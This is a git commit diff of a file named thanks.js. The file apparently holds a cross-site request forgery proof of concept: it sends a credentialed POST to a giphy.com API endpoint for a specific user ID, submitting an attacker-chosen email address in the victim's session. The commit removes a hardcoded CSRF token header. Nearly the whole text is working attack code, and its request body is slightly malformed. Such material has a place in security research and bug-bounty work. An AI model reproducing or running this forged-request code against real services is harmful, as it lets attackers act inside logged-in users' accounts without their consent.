6af69fe2fa24dd5f3887330115e2005132c1359c
naysser <77415898+naysser@users.noreply.github.com>
2021-08-24 22:35:21 +0200

    Update thanks.js

--- thanks.js
+++ thanks.js
@@ -11,6 +11,5 @@ var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
     xhr.open("post", "https://giphy.com/api/v1/users/29382035/freelance-email/", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.setRequestHeader("X-Csrftoken", "vkSFCCeHqVMtApCGZDCWuX37m0s47uPFmFT8GnBpAuHQB6kteXqrEQYjgqWySH2Q");
 
     xhr.send("email=userchange@live.fr&project_type=Editorial&project_start_date=1970-01-01&project_end_date=2021-08-24&project_budget_min=5001project_budget_max=2000&project_gif_count=1&project_sticker_count=0&project_video_count=0&project_flexible=false");
